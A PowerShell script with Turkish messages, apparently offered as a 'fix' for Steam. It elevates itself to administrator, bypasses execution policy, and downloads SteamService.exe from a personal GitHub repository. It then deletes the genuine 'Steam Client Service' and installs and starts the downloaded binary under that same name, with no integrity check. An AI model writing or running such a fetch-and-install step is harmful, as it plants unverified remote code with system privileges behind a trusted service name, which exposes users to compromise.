$ErrorActionPreference = 'Stop'

$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $self = $MyInvocation.MyCommand.Path
    if (-not $self) { $self = $PSCommandPath }
    $ps = Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe'
    Start-Process -FilePath $ps -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $self) -Verb RunAs
    exit 0
}

$serviceName = 'Steam Client Service'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
if (-not $here) { $here = Split-Path -Parent $PSCommandPath }

$installer = Join-Path $here 'SteamService.exe'
$url = 'https://raw.githubusercontent.com/mrtymy/Fix/main/Fixer/SteamService.exe'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Write-Host 'SteamService.exe indiriliyor...'
Invoke-WebRequest -Uri $url -OutFile $installer -UseBasicParsing
if (-not (Test-Path -LiteralPath $installer)) {
    Write-Host 'SteamService.exe indirilemedi.'
    Read-Host 'Kapatmak icin Enter'
    exit 1
}

Write-Host ''
Write-Host '==== NextPlay Steam Service ===='
Write-Host ''
& sc.exe query $serviceName | Out-Null
if ($LASTEXITCODE -eq 0) {
    Write-Host 'Servis durduruluyor...'
    & sc.exe stop $serviceName | Out-Null
    Start-Sleep -Seconds 2
    Write-Host 'Servis siliniyor...'
    & sc.exe delete $serviceName | Out-Null
    Start-Sleep -Seconds 2
}
Write-Host 'Servis kuruluyor...'
& $installer /install
Start-Sleep -Seconds 2
Write-Host 'Servis baslatiliyor...'
& sc.exe start $serviceName 2>&1 | Out-Null
Write-Host ''
Write-Host 'Islem tamamlandi.'

Write-Host ''
Read-Host 'Kapatmak icin Enter'
